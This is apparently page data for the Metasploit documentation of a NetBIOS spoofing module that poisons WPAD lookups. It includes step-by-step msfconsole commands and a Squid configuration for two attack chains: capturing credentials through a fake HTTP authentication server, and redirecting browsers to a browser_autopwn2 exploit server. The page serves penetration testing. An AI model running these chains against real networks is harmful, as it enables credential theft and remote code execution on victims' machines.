{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/auxiliary/admin/netbios/netbios_spoof","result":{"data":{"moduleMetadataJson":{"id":"8c7f9344-8139-5e7a-9b1c-247a71de09f9","name":"NetBIOS Response Brute Force Spoof (Direct)","fullname":"auxiliary/admin/netbios/netbios_spoof","description":"This module continuously spams NetBIOS responses to a target for given hostname,\n        causing the target to cache a malicious address for this name. On high-speed local\n        networks, the PPSRATE value should be increased to speed up this attack. As an\n        example, a value of around 30,000 is almost 100% successful when spoofing a\n        response for a 'WPAD' lookup. Distant targets may require more time and lower\n        rates for a successful attack.","rank":300,"fields":{"detailsSlug":"/modules/details/auxiliary/admin/netbios/netbios_spoof","documentationSlug":"/modules/documentation/auxiliary/admin/netbios/netbios_spoof","referencesSlug":"/modules/references/auxiliary/admin/netbios/netbios_spoof"},"documentation":{"html":"<p>netbios_spoof continuously spams NetBIOS responses to a target for given hostname, causing the\ntarget to cache a malicious address for this name. By default, the module will attempt to poison\nWPAD, forcing the target system to communicate with a fake server that can be leveraged to steal\nsensitive information, or obtain arbitrary code execution.</p>\n<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>Windows is the most ideal target because it supports WPAD by default.</p>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<p><strong>NBADDR</strong></p>\n<p>The address that the NetBIOS name (NBNAME) should resolve to.</p>\n<p><strong>NBNAME</strong></p>\n<p>The NetBIOS name to spoof a reply for.</p>\n<p><strong>PPSRATE</strong></p>\n<p>The rate at which to send NetBIOS replies.</p>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<p><strong>Credential Collection Attack Using Targeted NetBIOS Spoofing:</strong></p>\n<p>The following example uses http<em>basic, but other modules (such as http</em>ntlm) also applies.</p>\n<p>Step 1: Start the first Metasploit instance:</p>\n<ol>\n<li><code class=\"language-text\">rvmsudo ./msfconsole -q</code></li>\n<li><code class=\"language-text\">use auxiliary/server/capture/http_basic</code></li>\n<li><code class=\"language-text\">set REALM google.com</code></li>\n<li><code class=\"language-text\">set URIPATH /</code></li>\n<li><code class=\"language-text\">run</code></li>\n</ol>\n<p>Step 2: Start the second Metasploit instance:</p>\n<ol>\n<li><code class=\"language-text\">rvmsudo ./msfconsole -q</code></li>\n<li><code class=\"language-text\">use auxiliary/admin/netbios/netbios_spoof</code></li>\n<li><code class=\"language-text\">set NBADDR [IP to fake HTTP auth server]</code></li>\n<li><code class=\"language-text\">set PPSRATE 30000</code></li>\n<li><code class=\"language-text\">set RHOST [Target Host]</code></li>\n<li><code class=\"language-text\">run</code></li>\n</ol>\n<p>Step 3: On the victim machine:</p>\n<ol>\n<li>Make sure IE automatically detects settings (under LAN settings)</li>\n<li>Start IE, as soon as it opens, IE should try to authenticate.</li>\n</ol>\n<p>If the spoofed name has already been cached, you can do this to flush. And then next time IE will\nbe asked for credentials again.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">ipconfig /flushdns</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<p><strong>Arbitrary Code Execution Using Targeted NetBIOS Spoofing:</strong></p>\n<p>The following example will spoof WPAD and causes google.com to redirect to an exploit server.</p>\n<p>Step 1: Start the first Metasploit instance:</p>\n<ol>\n<li><code class=\"language-text\">rvmsudo ./msfconsole -q</code></li>\n<li><code class=\"language-text\">use auxiliary/server/browser_autopwn2</code></li>\n<li><code class=\"language-text\">set SRVPORT 8181</code></li>\n<li><code class=\"language-text\">run</code></li>\n</ol>\n<p>Remember the BrowserAutoPwn URL, you will need this info for the proxy configuration file.</p>\n<p>Step 2: Install <a href=\"http://www.squid-cache.org/\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Squid</a> Proxy server (or <a href=\"http://squidman.net/squidman/\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">SquidMan</a> if you use OS X), and edit the configuration file:</p>\n<p>First, uncomment these settings if they are found in the file:</p>\n<ul>\n<li>http_access deny all</li>\n<li>http<em>access deny !Safe</em>ports</li>\n<li>http<em>access deny CONNECT !SSL</em>ports</li>\n<li>http<em>access deny to</em>localhost</li>\n<li>http_access deny all</li>\n<li>always_direct deny all</li>\n</ul>\n<p>Second, add the following (make sure the change MyNetwork setting, and update the BrowserAutoPwn\nURL field:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">acl MyNetwork src 192.168.1.0/24\nacl BLKSite dstdomain .google.com\ndeny_info [BrowserAutoPwn URL] all\nhttp_reply_access deny BLKSite all\nhttp_access allow MyNetwork</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Step 3: Start the second Metasploit instance:</p>\n<ol>\n<li><code class=\"language-text\">rvmsudo ./msfconsole -q</code></li>\n<li><code class=\"language-text\">use auxiliary/server/wpad</code></li>\n<li><code class=\"language-text\">set PROXY [Proxy IP]</code></li>\n<li><code class=\"language-text\">set PROXYPORT 8080</code></li>\n<li><code class=\"language-text\">run</code></li>\n</ol>\n<p>Step 4: Start the third Metasploit instance:</p>\n<ol>\n<li><code class=\"language-text\">rvmsudo ./msfconsole -q</code></li>\n<li><code class=\"language-text\">use auxiliary/admin/netbios/netbios_spoof</code></li>\n<li><code class=\"language-text\">set NBADDR [IP to fake HTTP server]</code></li>\n<li><code class=\"language-text\">set PPSRATE 30000</code></li>\n<li><code class=\"language-text\">set RHOST [Target Host]</code></li>\n<li><code class=\"language-text\">run</code></li>\n</ol>\n<p>Step 5: On the victim machine:</p>\n<ol>\n<li>Make sure IE automatically detects settings (under LAN settings)</li>\n<li>Start IE</li>\n<li>Go to google.com, IE should end up loading the exploit server.</li>\n</ol>\n<p>If the spoofed name has already been cached, you can do this to flush.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">ipconfig /flushdns</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>"}}},"pageContext":{"id":"8c7f9344-8139-5e7a-9b1c-247a71de09f9"}}}